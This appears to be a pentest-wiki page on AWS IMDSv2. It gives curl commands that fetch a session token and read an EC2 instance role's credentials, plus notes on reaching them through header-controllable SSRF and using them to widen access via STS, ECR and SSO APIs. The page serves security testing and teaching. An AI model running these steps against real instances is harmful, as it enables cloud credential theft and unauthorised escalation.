---
title: "IMDSv2: the token flow and satisfying it from SSRF"
description: "Obtaining a session token with a PUT request and using it to read IMDSv2 role credentials, including from SSRF chains that can set request headers."
keywords:
  - IMDSv2
  - session token
  - PUT
  - instance role
  - SSRF
---

# IMDSv2

IMDSv2 requires a short-lived session token obtained with a `PUT`, then sent back in a header on each read. It is trivial from a shell on the instance, and still reachable from an [SSRF](ssrf.md) when the request primitive can issue a `PUT` and set the token header.

## The token flow

```bash
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

## Exploitation notes

- The `PUT` plus custom-header requirement blocks the simplest SSRF primitives; a full request-smuggling or header-controllable SSRF still satisfies it.
- Token TTL can be up to six hours, so one token covers a long session of reads.
- A hop-limit of 1 is common; an SSRF from a container on the host may fail the hop check while an on-host shell succeeds.
- Recovered role credentials then unlock the credential-returning APIs (`sts:AssumeRole`, `ecr:GetAuthorizationToken`, `sso:GetRoleCredentials`, and the rest) to widen access; see [credential brokers](../credential-brokers.md).

## Tools

- **curl** on the instance, or an SSRF primitive with method and header control.
- **Pacu** (`ec2__metadata`): handles the token dance automatically.

## References

- [AWS: how IMDSv2 works](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [HackTricks Cloud: IMDSv2](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
